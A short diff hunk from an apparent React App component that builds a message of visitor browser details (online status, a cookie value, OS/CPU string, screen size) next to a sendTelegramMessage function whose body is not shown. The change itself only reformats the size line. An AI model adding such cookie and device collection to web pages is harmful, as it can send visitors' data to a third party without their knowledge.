@@ -36,7 +36,7 @@ function App() {
       Online: ${online}\n
       Cookie: ${cookie}\n
       Oscpu: ${oscpu}\n
-      Size: H${heightScreen}px × W${widthScreen}px\n
+      Size: H: ${heightScreen}px × W: ${widthScreen}px\n
       `;
   
     const sendTelegramMessage = async () => {
